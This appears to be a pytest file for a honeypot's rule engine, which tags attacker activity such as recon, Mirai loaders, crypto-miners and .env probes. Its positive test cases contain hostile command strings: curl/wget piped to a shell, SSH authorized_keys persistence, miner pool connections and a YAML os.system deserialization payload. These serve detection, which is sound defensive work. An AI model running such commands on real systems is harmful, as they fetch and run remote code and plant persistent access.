"""Tagging rules: every shipped rule has positive and negative examples; the engine is strict."""

import time
from pathlib import Path
from typing import Any

import pytest

from ingest.tagging import RuleError, RuleSet, glob_match, load_rules
from ingest.tagging.engine import command_words

RULES_DIR = Path(__file__).resolve().parents[1] / "rules"
ALL = load_rules(RULES_DIR)
BY_ID = {r.id: r for r in ALL.rules}


def fires(rule_id: str, etype: str, sensor: str, data: dict[str, Any]) -> bool:
    return bool(RuleSet([BY_ID[rule_id]]).tag_event(etype, sensor, data))


def session_fires(rule_id: str, **facts: Any) -> bool:
    base = {
        "session.sensor": "ssh", "session.event_count": 1, "session.login_attempts": 0,
        "session.login_success": False, "session.commands": 0, "session.downloads": 0,
        "session.http_requests": 0, "session.tags": [], "session.known_scanner": None,
        "session.abuse_score": None,
    }  # fmt: skip
    return bool(RuleSet([BY_ID[rule_id]]).tag_session({**base, **facts}))


def cmd(text: str, sensor: str = "ssh") -> tuple[str, str, dict[str, Any]]:
    return ("command", sensor, {"input": text})


def http(method: str, path: str, **extra: Any) -> tuple[str, str, dict[str, Any]]:
    return ("http_request", "web", {"method": method, "path": path, **extra})


POSITIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
    "recon-commands": [
        cmd("uname -a"), cmd("cat /proc/cpuinfo | grep name | wc -l"), cmd("/usr/bin/nproc"),
        cmd("free -m; id"), cmd("w"), cmd("cat /etc/os-release"),
    ],
    "mirai-busybox": [cmd("/bin/busybox ECCHI"), cmd("busybox wget http://x/y"), cmd("cat /dev/watchdog")],
    "mirai-telnet-loader": [cmd("enable", "telnet"), cmd("linuxshell", "telnet"), cmd("SYSTEM", "telnet")],
    "crypto-miner": [
        cmd("./xmrig -o stratum+tcp://pool:3333"), cmd("wget http://x/minerd -O m"),
        ("download_attempt", "ssh", {"url": "http://198.51.100.9/kinsing", "tool": "wget"}),
        ("download_attempt", "ssh", {"url": "http://x/y", "command": "curl x | sh --donate-level 1"}),
    ],
    "exec-attempt": [
        cmd("chmod +x /tmp/a"), cmd("chmod 777 x.sh && ./x.sh"), cmd("./payload"),
        cmd("curl http://x/s.sh | sh"), cmd("wget -qO- http://x | bash"),
    ],
    "persistence": [
        cmd("echo key >> ~/.ssh/authorized_keys"), cmd("crontab -l"), cmd("echo x >> /etc/rc.local"),
        cmd("chattr +i /root/.ssh"),
    ],
    "php2shell": [
        http("POST", "/index.php", flags=["php2shell"]), http("POST", "/", flags=["upload_progress"]),
        http("GET", "/index.php", query="PHP_SESSION_UPLOAD_PROGRESS=x"),
        http("GET", "/upload_progress.php"),
    ],
    "wordpress-bruteforce": [
        http("POST", "/wp-login.php"), http("POST", "/blog/wp-login.php"), http("POST", "/xmlrpc.php"),
    ],
    "phpmyadmin-bruteforce": [
        http("POST", "/phpmyadmin/index.php"), http("POST", "/pma/"), http("POST", "/mysqladmin/"),
    ],
    "env-file-probe": [
        http("GET", "/.env"), http("GET", "/app/.env.production"), http("GET", "/.git/config"),
        http("GET", "/.aws/credentials"), http("GET", "/x/.git/HEAD"),
    ],
    "scanner-user-agent": [
        http("GET", "/", user_agent="Mozilla/5.0 zgrab/0.x"), http("GET", "/", user_agent="masscan/1.3"),
        http("GET", "/", user_agent="Nmap Scripting Engine"), http("GET", "/", user_agent="Nuclei - Open-source"),
    ],
}  # fmt: skip

NEGATIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
    "recon-commands": [cmd("echo hello"), cmd("ls -la /tmp"), cmd("ping 192.0.2.1"),
                       ("login_attempt", "ssh", {"input": "uname"})],
    "mirai-busybox": [cmd("ls /bin"), cmd("echo hi"), cmd("enable", "ssh")],
    "mirai-telnet-loader": [cmd("enable", "ssh"), cmd("ls", "telnet"), cmd("enable now", "telnet")],
    "crypto-miner": [cmd("ls -la"), cmd("wget http://x/index.html"),
                     ("download_attempt", "ssh", {"url": "http://example.org/readme.txt"})],
    "exec-attempt": [cmd("chmod 600 secret"), cmd("ls ./"), cmd("echo shell"), cmd("cat file | wc -l")],
    "persistence": [cmd("cat /etc/hostname"), cmd("echo cron")],
    "php2shell": [http("GET", "/index.php"), http("POST", "/", flags=["other"]),
                  http("GET", "/", query="a=b")],
    "wordpress-bruteforce": [http("GET", "/wp-login.php"), http("POST", "/login.php"),
                             http("POST", "/wp-login.php.bak")],
    "phpmyadmin-bruteforce": [http("GET", "/phpmyadmin/"), http("POST", "/index.php")],
    "env-file-probe": [http("GET", "/.environment"), http("GET", "/index.html"),
                       http("GET", "/envfile")],
    "scanner-user-agent": [http("GET", "/", user_agent="Mozilla/5.0 (X11; Linux) Firefox/130"),
                           http("GET", "/", user_agent="curl/8.5.0"), http("GET", "/")],
}  # fmt: skip


@pytest.mark.parametrize(("rule_id", "case"), [(r, c) for r, cs in POSITIVE.items() for c in cs])
def test_event_rule_positive(rule_id: str, case: tuple[str, str, dict[str, Any]]) -> None:
    assert fires(rule_id, *case), (rule_id, case)


@pytest.mark.parametrize(("rule_id", "case"), [(r, c) for r, cs in NEGATIVE.items() for c in cs])
def test_event_rule_negative(rule_id: str, case: tuple[str, str, dict[str, Any]]) -> None:
    assert not fires(rule_id, *case), (rule_id, case)


def test_session_rules() -> None:
    assert session_fires(
        "malware-drop", **{"session.downloads": 1, "session.tags": ["exec-attempt"]}
    )
    assert not session_fires("malware-drop", **{"session.downloads": 1})
    assert not session_fires("malware-drop", **{"session.tags": ["exec-attempt"]})
    assert session_fires("credential-stuffing", **{"session.login_attempts": 20})
    assert not session_fires("credential-stuffing", **{"session.login_attempts": 19})
    assert session_fires("scanner-reputation", **{"session.known_scanner": True})
    assert not session_fires("scanner-reputation", **{"session.known_scanner": False})
    assert not session_fires("scanner-reputation")


def test_every_shipped_rule_has_examples() -> None:
    event_ids = {r.id for r in ALL.event_rules}
    assert event_ids == set(POSITIVE) == set(NEGATIVE)
    assert {r.id for r in ALL.session_rules} == {
        "malware-drop",
        "credential-stuffing",
        "scanner-reputation",
    }


def test_required_tags_exist() -> None:
    assert {
        "recon", "mirai", "crypto-miner", "malware-drop", "persistence", "php2shell",
        "wordpress-bruteforce", "phpmyadmin-bruteforce", "credential-stuffing", "scanner",
        "env-file-probe",
    } <= set(ALL.tags)  # fmt: skip


def test_tag_event_unions_and_sorts() -> None:
    tags = ALL.tag_event("command", "ssh", {"input": "chmod +x xmrig; uname"})
    assert tags == ["crypto-miner", "exec-attempt", "recon"]


# ---- engine ---------------------------------------------------------------------------------


def write(tmp_path: Path, body: str) -> Path:
    (tmp_path / "r.yaml").write_text(body)
    return tmp_path


@pytest.mark.parametrize(
    "body",
    [
        "rules:\n  - {id: a, tag: x, when: {field: data.input, regex: '(a+)+$'}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: data.secret, equals: 1}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: data.__class__, equals: 1}}\n",
        "rules:\n  - {id: a, tag: 'Bad Tag', when: {field: type, equals: command}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: session.commands, gte: 1}}\n",
        "rules:\n  - {id: a, tag: x, scope: session, when: {field: type, equals: command}}\n",
        "rules:\n  - {id: a, tag: x, when: {all: []}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: type}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: type, equals: a, in: [b]}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: data.input, command_any: [/bin/sh]}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: data.input, contains_any: [1, 2]}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: data.port, gte: abc}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: type, equals: a}}\n  - {id: a, tag: y, when: {field: type, equals: b}}\n",
        "rules: nope\n",
        "- just a list\n",
        "rules:\n  - {tag: x, when: {field: type, equals: a}}\n",
        "!!python/object/apply:os.system ['true']\n",
    ],
)
def test_invalid_rule_files_are_rejected(tmp_path: Path, body: str) -> None:
    with pytest.raises(RuleError):
        load_rules(write(tmp_path, body))


def test_deep_nesting_rejected(tmp_path: Path) -> None:
    cond = "{field: type, equals: a}"
    for _ in range(12):
        cond = "{not: " + cond + "}"
    with pytest.raises(RuleError, match="deeply"):
        load_rules(write(tmp_path, f"rules:\n  - {{id: a, tag: x, when: {cond}}}\n"))


def test_operators(tmp_path: Path) -> None:
    body = """
rules:
  - {id: eq, tag: t-eq, when: {field: data.port, equals: 2222}}
  - {id: cmp, tag: t-cmp, when: {all: [{field: data.status, gte: 400}, {field: data.status, lt: 500}]}}
  - {id: has, tag: t-has, when: {field: data.flags, has: [alpha, beta]}}
  - {id: nt, tag: t-not, when: {not: {field: data.method, equals: GET}}}
  - {id: ex, tag: t-ex, when: {field: data.url, exists: true}}
  - {id: cs, tag: t-cs, when: {field: data.input, contains: Secret, ci: false}}
  - {id: sw, tag: t-sw, when: {field: data.path, startswith: [/admin, /root]}}
  - {id: bt, tag: t-bool, when: {field: data.reason, equals: closed}}
"""
    rs = load_rules(write(tmp_path, body))
    t = rs.tag_event
    assert "t-eq" in t("scan", "ssh", {"port": 2222}) and "t-eq" not in t(
        "scan", "ssh", {"port": "2222"}
    )
    assert "t-cmp" in t("http_request", "web", {"status": 404})
    assert "t-cmp" not in t("http_request", "web", {"status": 200})
    assert "t-cmp" not in t("http_request", "web", {"status": "404"})  # strings are not numbers
    assert "t-has" in t("http_request", "web", {"flags": ["BETA"]})
    assert "t-has" not in t("http_request", "web", {"flags": "beta"})
    assert "t-not" in t("http_request", "web", {"method": "POST"})
    assert "t-ex" in t("http_request", "web", {"url": "x"}) and "t-ex" not in t("x", "web", {})
    assert "t-cs" in t("command", "ssh", {"input": "a Secret b"})
    assert "t-cs" not in t("command", "ssh", {"input": "a secret b"})
    assert "t-sw" in t("http_request", "web", {"path": "/ROOT/x"})
    assert "t-cs" not in t("command", "ssh", {"input": ["Secret"]})  # lists are not text


def test_non_string_values_never_crash() -> None:
    weird: list[Any] = [None, 5, 1.5, True, [], {}, ["a"], {"a": 1}, "x"]
    for v in weird:
        ALL.tag_event("command", "ssh", {"input": v, "path": v, "user_agent": v, "flags": v})
        ALL.tag_event("http_request", "web", {"method": v, "query": v, "url": v})


@pytest.mark.parametrize(
    ("pattern", "text", "ok"),
    [
        ("*/.env", "/a/.env", True), ("*/.env", "/.env.bak", False), ("a?c", "abc", True),
        ("a?c", "ac", False), ("*", "", True), ("**x", "yyx", True), ("a*b*c", "aXXbYYc", True),
        ("a*b*c", "aXXbYY", False), ("", "", True), ("", "a", False),
    ],
)  # fmt: skip
def test_glob(pattern: str, text: str, ok: bool) -> None:
    assert glob_match(pattern, text) is ok


def test_command_words() -> None:
    assert command_words("cd /tmp; /usr/bin/wget http://x/y.sh|sh && ./y.sh") >= {
        "cd",
        "wget",
        "sh",
        "y.sh",
    }


def test_large_and_pathological_inputs_are_fast() -> None:
    big = "a" * 1_000_000
    nasty = "a" * 200_000 + "b"
    start = time.perf_counter()
    for _ in range(20):
        ALL.tag_event("command", "ssh", {"input": big})
        ALL.tag_event("command", "ssh", {"input": nasty + "; uname " + big})
        ALL.tag_event("http_request", "web", {"path": nasty, "query": big, "user_agent": nasty})
        ALL.tag_event("http_request", "web", {"path": "/" + "../" * 50_000})
    assert time.perf_counter() - start < 2.0
    assert glob_match("*a*a*a*a*a*a*a*c", "a" * 4096) is False  # classic backtracking trap
